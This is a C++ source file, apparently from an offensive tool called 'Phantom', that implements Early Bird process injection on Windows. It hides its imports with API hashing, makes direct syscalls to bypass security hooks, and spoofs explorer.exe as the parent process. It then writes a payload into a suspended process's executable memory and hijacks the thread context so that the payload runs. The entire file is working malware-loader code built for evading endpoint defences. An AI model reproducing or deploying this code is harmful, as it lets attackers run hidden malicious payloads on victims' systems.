#include "EarlyBirdInjection.h"
#include "util.h"
#include <stdexcept>
#include <tlhelp32.h>

// --- COMPILE-ZEIT HASHING ---
constexpr DWORD ntAllocateVirtualMemory_hash = Phantom::Util::a_hash("NtAllocateVirtualMemory");
constexpr DWORD ntWriteVirtualMemory_hash = Phantom::Util::a_hash("NtWriteVirtualMemory");
constexpr DWORD ntGetContextThread_hash = Phantom::Util::a_hash("NtGetContextThread");
constexpr DWORD ntSetContextThread_hash = Phantom::Util::a_hash("NtSetContextThread");
constexpr DWORD ntResumeThread_hash = Phantom::Util::a_hash("NtResumeThread");

// --- Globale Instanzen ---
SyscallData g_sNtAllocateVirtualMemory;
SyscallData g_sNtWriteVirtualMemory;
SyscallData g_sNtGetContextThread;
SyscallData g_sNtSetContextThread;
SyscallData g_sNtResumeThread;

// --- Externe Syscall-Funktionen ---
extern "C" {
    NTSTATUS SyscallNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS SyscallNtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS SyscallNtGetContextThread(HANDLE, PCONTEXT);
    NTSTATUS SyscallNtSetContextThread(HANDLE, PCONTEXT);
    NTSTATUS SyscallNtResumeThread(HANDLE, PULONG);
}

EarlyBirdInjection::EarlyBirdInjection(HMODULE hNtdllParam) : hNtdll(hNtdllParam) {
    if (!hNtdll || !resolveSyscalls()) {
        throw std::runtime_error("Failed to initialize EarlyBirdInjection technique.");
    }
}

EarlyBirdInjection::~EarlyBirdInjection() {}

bool EarlyBirdInjection::resolveSyscalls() {
    #define SET_SYSCALL(name, pFunc) \
        if (pFunc) { \
            g_s##name.syscall_id = *((DWORD*)((BYTE*)pFunc + 4)); \
        }

    #define RESOLVE(name) Phantom::Util::getProcAddressByHash(hNtdll, name##_hash)
    PVOID pNtAllocate = RESOLVE(ntAllocateVirtualMemory);
    PVOID pNtWrite = RESOLVE(ntWriteVirtualMemory);
    PVOID pNtGetContext = RESOLVE(ntGetContextThread);
    PVOID pNtSetContext = RESOLVE(ntSetContextThread);
    PVOID pNtResume = RESOLVE(ntResumeThread);

    if (!pNtAllocate || !pNtWrite || !pNtGetContext || !pNtSetContext || !pNtResume) return false;

    SET_SYSCALL(NtAllocateVirtualMemory, pNtAllocate);
    SET_SYSCALL(NtWriteVirtualMemory, pNtWrite);
    SET_SYSCALL(NtGetContextThread, pNtGetContext);
    SET_SYSCALL(NtSetContextThread, pNtSetContext);
    SET_SYSCALL(NtResumeThread, pNtResume);
    return true;
}

InjectionResult EarlyBirdInjection::inject(
    const std::string& processName, 
    const std::vector<unsigned char>& payloadBundle,
    size_t codeOffset) 
{
    HANDLE hParentProcess = Phantom::Util::findProcessByName("explorer.exe");
    if (hParentProcess == NULL) {
        return InjectionResult::PROCESS_NOT_FOUND;
    }

    STARTUPINFOEXA siEx = { sizeof(siEx) };
    PROCESS_INFORMATION pi;
    SIZE_T attributeListSize;

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeListSize);
    siEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeListSize);
    InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, &attributeListSize);
    UpdateProcThreadAttribute(siEx.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);

    siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    if (!CreateProcessA(NULL, (LPSTR)processName.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siEx.StartupInfo, &pi)) {
        DeleteProcThreadAttributeList(siEx.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
        CloseHandle(hParentProcess);
        return InjectionResult::PROCESS_CREATION_FAILED;
    }
    
    DeleteProcThreadAttributeList(siEx.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
    CloseHandle(hParentProcess);

    PVOID remoteBuffer = NULL;
    SIZE_T regionSize = payloadBundle.size();
    NTSTATUS status = SyscallNtAllocateVirtualMemory(pi.hProcess, &remoteBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) { TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return InjectionResult::MEMORY_ALLOCATION_FAILED; }

    SIZE_T bytesWritten;
    status = SyscallNtWriteVirtualMemory(pi.hProcess, remoteBuffer, (PVOID)payloadBundle.data(), payloadBundle.size(), &bytesWritten);
    if (status != 0 || bytesWritten != payloadBundle.size()) { 
        VirtualFreeEx(pi.hProcess, remoteBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); 
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return InjectionResult::MEMORY_WRITE_FAILED; 
    }

    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteBuffer, payloadBundle.size(), PAGE_EXECUTE_READ, &oldProtect);

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    status = SyscallNtGetContextThread(pi.hThread, &ctx);
    if (status != 0) { 
        VirtualFreeEx(pi.hProcess, remoteBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); 
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return InjectionResult::INJECTION_FAILED; 
    }

    // Setze den Instruction Pointer auf den Anfang unseres Codes
    // und das erste Argument (RCX) auf die Basisadresse des Bundles
    ctx.Rip = (DWORD64)((char*)remoteBuffer + codeOffset);
    ctx.Rcx = (DWORD64)remoteBuffer;

    status = SyscallNtSetContextThread(pi.hThread, &ctx);
    if (status != 0) { 
        VirtualFreeEx(pi.hProcess, remoteBuffer, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); 
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return InjectionResult::INJECTION_FAILED; 
    }

    status = SyscallNtResumeThread(pi.hThread, NULL);
    if (status != 0) { 
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return InjectionResult::INJECTION_FAILED; 
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return InjectionResult::SUCCESS;
} 